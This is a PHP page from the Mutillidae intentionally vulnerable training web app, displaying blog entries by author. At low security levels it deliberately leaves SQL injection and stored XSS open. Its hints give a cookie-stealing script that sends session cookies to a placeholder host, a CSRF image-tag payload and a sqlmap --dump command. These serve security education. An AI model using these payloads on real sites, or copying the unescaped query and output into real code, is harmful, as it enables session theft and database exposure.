<?php
	/* Defined our constants to use to tokenize allowed HTML characters */
	include_once './includes/constants.php';


	switch ($_SESSION["security-level"]){
   		case "0": // This code is insecure
   		case "1": // This code is insecure
   			// DO NOTHING: This is insecure		
			$lEncodeOutput = FALSE;
			$lTokenizeAllowedMarkup = FALSE;
			$lProtectAgainstSQLInjection = FALSE;
			break;
	    		
			case "2":
			case "3":
			case "4":
			case "5": // This code is fairly secure
  			/* 
  			 * NOTE: Input validation is excellent but not enough. The output must be
  			 * encoded per context. For example, if output is placed in HTML,
  			 * then HTML encode it. Blacklisting is a losing proposition. You 
  			 * cannot blacklist everything. The business requirements will usually
  			 * require allowing dangerous charaters. In the example here, we can 
  			 * validate username but we have to allow special characters in passwords
  			 * least we force weak passwords. We cannot validate the signature hardly 
  			 * at all. The business requirements for text fields will demand most
  			 * characters. Output encoding is the answer. Validate what you can, encode it
  			 * all.
  			 */
   			// encode the output following OWASP standards
   			// this will be HTML encoding because we are outputting data into HTML
			$lEncodeOutput = TRUE;
			
			/* Business Problem: Sometimes the business requirements define that users
			 * should be allowed to use some HTML  markup. If unneccesary, this is a
			 * bad idea. Output encoding will naturally kill any users attempt to use HTML
			 * in their input, which is exactly why we use output encoding. 
			 * 
			 * If the business process allows some HTML, then those HTML items are elevated
			 * from "mallicious input" to "direct object refernces" (a resource to be enjoyed).
			 * When we want to restrict a user to using to "direct object refernces" (a 
			 * resource to be enjoyed) responsibly, we use mapping. Mapping allows the user
			 * to chose from a "system generated" (that's us programmers) set of tokens
			 * to pick from. We need to assure that the user either chooses one of the tokens
			 * we offer, or our system rejects the request. To put it bluntly, either the user
			 * follows the rules, or their output is encoded. Period.
			 */
			$lTokenizeAllowedMarkup = TRUE;
			
			/* If we are in secure mode, we need to protect against SQLi */
			$lProtectAgainstSQLInjection = TRUE;
   		break;
   	}// end switch		
?>

<div class="page-title">View Blogs</div>

<?php include_once './includes/back-button.inc';?>

<fieldset>
	<legend>View Blog Entries</legend>
	<span>
		<a href="http://localhost/mutillidae/index.php?page=add-to-your-blog.php">
		<img style="vertical-align: middle;" src="./images/add_icon.png" height="32px" width="32px" />
		<span style="font-weight:bold; text-decoration: none;">Add To Your Blog</span>
		</a>
	</span>
	<form action="index.php?page=view-someones-blog.php" method="post" enctype="application/x-www-form-urlencoded">
		<table style="margin-left:auto; margin-right:auto;">
			<tr id="id-bad-blog-entry-tr" style="display: none;">
				<td class="error-message">
					Validation Error: Please choose blog entries to view
				</td>
			</tr>
			<tr><td></td></tr>
			<tr>
				<td id="id-blog-form-header-td" class="form-header">Select Author and Click to View Blog</td>
			</tr>
			<tr><td></td></tr>
			<tr>
				<td>
					<select name="author" id="id_author_select">
						<option value="53241E83-76EC-4920-AD6D-503DD2A6BA68">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Please Choose Author&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</option>
						<option value="6C57C4B5-B341-4539-977B-7ACB9D42985A">Show All</option>
						<?php
							try {
								$query  = "SELECT * FROM accounts";
								$result = $conn->query($query);
								if (!$result) {
							    	throw (new Exception('Error executing query: '.$conn->error, $conn->errorno));
							    }// end if							    
							    while($row = $result->fetch_object()){

									if(!$lEncodeOutput){
										$lUsername = $row->username;
									}else{
										$lUsername = $Encoder->encodeForHTML($row->username);
									}// end if
									
								    echo '<option value="' . $lUsername . '">' . $lUsername . '</option>\n';
									
								}// end while
							} catch (Exception $e) {
								echo $CustomErrorHandler->FormatError($e, $query);
							}// end try		
						?>
					</select>
					<input name="view-someones-blog-php-submit-button" class="button" type="submit" value="View Blog Entries" />
				</td>
			</tr>
			<tr><td></td></tr>
		</table>
	</form>
</fieldset>

<?php
	/* Known Vulnerabilities: 
		SQL injection, Cross Site Scripting, Cross Site Request Forgery
		Known Vulnerable Output: Name, Comment
	*/

	if(isSet($_POST["view-someones-blog-php-submit-button"])){
		try {

			/* Note that $conn->real_escape_string is ok but not the best defense. Stored
			 * Procedures are a much more powerful defense, run much faster, can be
			 * trapped in a schema, can run on the database, and can be called from
			 * any number of web applications. Stored procs are the true anti-pwn.
			 * There are 3 ways that stored procs can be made vulenrable by developers,
			 * but they are safe by default. Queries are vulnerable by default.
			 */
			if($lProtectAgainstSQLInjection){
				$lAuthor = $conn->real_escape_string($_POST["author"]);
			}else{
				$lAuthor = $_REQUEST["author"];
			}// end if

			if ($lAuthor == "53241E83-76EC-4920-AD6D-503DD2A6BA68" || strlen($lAuthor) == 0){
				echo '<script>document.getElementById("id-bad-blog-entry-tr").style.display="";</script>';
			}else{
				if ($lAuthor == "6C57C4B5-B341-4539-977B-7ACB9D42985A"){
					$lAuthor = "%";
				}// end if

				$query  = "SELECT * FROM blogs_table WHERE
							blogger_name like '{$lAuthor}'
							ORDER BY date DESC
							LIMIT 0 , 100";
							
				$result = $conn->query($query);
				if (!$result) {
			    	throw (new Exception('Error executing query: '.$conn->error, $conn->errorno));
			    }// end if

				/* Report Header */
				echo '<div>&nbsp;</div>';
				echo '<table border="1px" width="90%" class="main-table-frame">';
			    echo '
			    	<tr class="report-header">
			    		<td colspan="4">'.$result->num_rows.' Current Blog Entries</td>
			    	</tr>
			    	<tr class="report-header">
			    		<td>&nbsp;</td>
					    <td>Name</td>
					    <td>Date</td>
					    <td>Comment</td>
				    </tr>';

			    $lRowNumber = 0;
			    while($row = $result->fetch_object()){
			    	
			    	$lRowNumber++;
			    			    	
			    	/* Simple but effective security against XSS. Encode output per context if
					 * we are in secure-mode.
					 */
					if(!$lEncodeOutput){
						$lBloggerName = $row->blogger_name;
						$lDate = $row->date;
						$lComment = $row->comment;
					}else{
						$lBloggerName = $Encoder->encodeForHTML($row->blogger_name);
						$lDate = $Encoder->encodeForHTML($row->date);
						$lComment = $Encoder->encodeForHTML($row->comment);
					}// end if
			    	
					/* Some dangerous markup allowed. Here we restore the tokenized output. 
					 * Note that using GUIDs as tokens works well because they are 
					 * fairly unique plus they encode to the same value. 
					 * Encoding wont hurt them.
					 * 
					 * Note: Mutillidae is weird. It has to be broken and unbroken at the same time.
					 * Here we un-tokenize our output no matter if we are in secure mode or not.
					 */
					$lComment = str_ireplace(BOLD_STARTING_TAG, '<span style="font-weight:bold;">', $lComment);
					$lComment = str_ireplace(BOLD_ENDING_TAG, '</span>', $lComment);
					$lComment = str_ireplace(ITALIC_STARTING_TAG, '<span style="font-style: italic;">', $lComment);
					$lComment = str_ireplace(ITALIC_ENDING_TAG, '</span>', $lComment);
					$lComment = str_ireplace(UNDERLINE_STARTING_TAG, '<span style="border-bottom: 1px solid #000000;">', $lComment);
					$lComment = str_ireplace(UNDERLINE_ENDING_TAG, '</span>', $lComment);
										
					echo "<tr>
							<td>{$lRowNumber}</td>
							<td>{$lBloggerName}</td>
							<td>{$lDate}</td>
							<td>{$lComment}</td>
						</tr>\n";
				}//end while $row
				echo "</table>";		
			    		
			}// end if ($lAuthor == "53241E83-76EC-4920-AD6D-503DD2A6BA68" || strlen($lAuthor) == 0)		

		} catch (Exception $e) {
			echo $CustomErrorHandler->FormatError($e, $query);
		}// end try		
	}// end if isSet($_POST["view-someones-blog-php-submit-button"])
?>

<?php
	// Begin hints section
	if ($_SESSION["showhints"]) {
		echo '
			<table>
				<tr><td class="hint-header">Hints</td></tr>
				<tr>
					<td class="hint-body">
						<ul class="hints">
						  	<li><b>For XSS:</b>XSS is easy stuff. This one shows off 
						  		both reflected (you see the results 
								instantly) and stored (someone can run across it 
								later in another app that uses the same database). 
								"&lt;script&gt;alert("XSS");&lt;/script&gt;" is the 
								classic, but there are far more interesting things you 
								could do which I plan show in a video later.
							</li>
						  	<li>For some hot cookie stealing action, try something like:
								<pre>
&lt;script&gt;
	new Image().src="http://some-ip/mutillidae/catch.php?cookie="+encodeURI(document.cookie);
&lt;/script&gt;
								</pre>	
							</li>
							<li>Check out <a href="http://ha.ckers.org/xss.html">Rsnake\'s XSS Cheet Sheet</a>
								for more ways you can encode XSS attacks that may 
								allow you to get around some filters.
							</li>
							<li><b>For CSRF:</b>You can create another page someplace and
							make a link to an image that is not an image. You can also
							send someone an HTML email with a link inside. Sending links over
							HTML aware Instant Messaging like Communicator also works. One of the 
							quietest methods is to use HTML injection to poison a web page thus 
							creating a persistant attack. When a user visits the poisoned page, 
							their browser will reach out to the targe page. Using an AJAX request 
							can keep the rouge tranaction silent.
							You could use something like the following:
							<br>
							&lt;img src="http://localhost/mutillidae/index.php?page=add-to-your-blog.php&input_from_form=hi%20there%20monkeyboy"&gt;
							<br>
							This is the easy way to do CSRF with the GET method. Login 
							as someone, make your page with the link image someplace else, 
							and then view it. You should now see
							something new on the comment wall.
							</li>
							<li>
								For Cross Site Request Forgery, a tool like the Social
								Engineering Toolkit by Dave Kennedy can help. 
							</li>
						</ul>
					</td>
				</tr>
				<tr><td>&nbsp;</td></tr>
				<tr class="hint-body">
					<td class="hint-body">
						To use sqlmap, you need to know the page URL. We can get that by viewing requests and responses with HTTPFox, Paros, Burp, etc.
						<br/><br/>
						We decide whether to attack via GET or POST. sqlmap will automatically test URL query parameters supplied in the URL that you give. 
						To tell sqlmap about POST parameters, use the &quot;--data&quot; switch. Discover all the POST parameters 
						using a tool like Burp to make this part easy.
						<br/><br/>
						Use the sqlmap help. Type python sqlmap.py -h.
						<br/><br/>
						When your ready, string all this information together:
						<br/>
						python sqlmap.py --url=&quot;http://192.168.56.101/mutillidae/index.php?page=view-someones-blog.php&quot; --data=&quot;author=6C57C4B5-B341-4539-977B-7ACB9D42985A&amp;view-someones-blog-php-submit-button=View+Blog+Entries&quot; --level=1 --beep --dump</td>
				</tr>
				
			</table>'; 
	}//end if ($_SESSION["showhints"])

	if ($_SESSION["showhints"] == 2) {
		include_once './includes/cross-site-scripting-tutorial.inc';
	}// end if
	
	if ($_SESSION["showhints"] == 2) {
		include_once './includes/sql-injection.inc';
	}// end if	
?>